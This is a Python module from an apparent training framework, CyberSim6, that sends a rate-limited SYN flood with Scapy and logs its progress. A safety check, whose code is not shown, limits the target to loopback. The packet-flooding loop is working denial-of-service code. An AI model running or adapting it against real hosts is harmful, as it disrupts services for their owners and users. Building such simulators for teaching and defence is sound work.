"""
CyberSim6 - SYN Flood Simulation
Simulates a SYN Flood attack using Scapy on localhost only.
Requires administrator/root privileges for raw socket access.
"""

import random
import threading
import time

from cybersim.core.base_module import BaseModule
from cybersim.core.safety import validate_target_ip, SafetyError


class SYNFloodAttack(BaseModule):
    """SYN Flood attack simulation using Scapy."""

    MODULE_TYPE = "attack"
    MODULE_NAME = "ddos_syn_flood"

    def _validate_safety(self):
        target = self.config.get("target", "127.0.0.1")
        validate_target_ip(target)

    def run(self, target: str = None, port: int = None,
            packet_count: int = None, rate_limit: int = None):
        """
        Launch SYN Flood simulation.

        Args:
            target: Target IP (must be loopback)
            port: Target port
            packet_count: Number of SYN packets to send
            rate_limit: Max packets per second
        """
        try:
            from scapy.all import IP, TCP, send, RandShort
        except ImportError:
            self.log_event("error", {
                "message": "Scapy not installed. Run: pip install scapy",
                "status": "error",
            })
            return

        target = target or self.config.get("target", "127.0.0.1")
        port = port or self.config.get("target_port", 8080)
        packet_count = packet_count or self.config.get("packet_count", 1000)
        rate_limit = rate_limit or self.config.get("rate_limit", 100)

        # Safety re-check
        validate_target_ip(target)

        self._running = True
        self.log_event("attack_started", {
            "message": f"SYN Flood started -> {target}:{port} ({packet_count} packets)",
            "target": f"{target}:{port}",
            "packet_count": packet_count,
            "rate_limit": rate_limit,
            "status": "warning",
        })

        delay = 1.0 / rate_limit if rate_limit > 0 else 0
        sent = 0

        for i in range(packet_count):
            if not self._running:
                break

            src_port = random.randint(1024, 65535)
            packet = IP(dst=target) / TCP(
                sport=src_port,
                dport=port,
                flags="S",
                seq=random.randint(0, 2**32 - 1),
            )

            try:
                send(packet, verbose=False)
                sent += 1
            except PermissionError:
                self.log_event("error", {
                    "message": "Permission denied. Run as administrator/root for raw sockets.",
                    "status": "error",
                })
                break
            except Exception as e:
                self.log_event("error", {
                    "message": f"Send error: {e}",
                    "status": "error",
                })

            if sent % 100 == 0:
                self.log_event("progress", {
                    "message": f"Sent {sent}/{packet_count} SYN packets",
                    "packets_sent": sent,
                    "status": "info",
                })

            if delay > 0:
                time.sleep(delay)

        self._running = False
        self.log_event("attack_completed", {
            "message": f"SYN Flood completed. {sent} packets sent.",
            "packets_sent": sent,
            "target": f"{target}:{port}",
            "status": "info",
        })

    def stop(self):
        """Stop the SYN Flood attack."""
        self._running = False
        self.log_event("attack_stopped", {
            "message": "SYN Flood stopped by user.",
            "status": "info",
        })
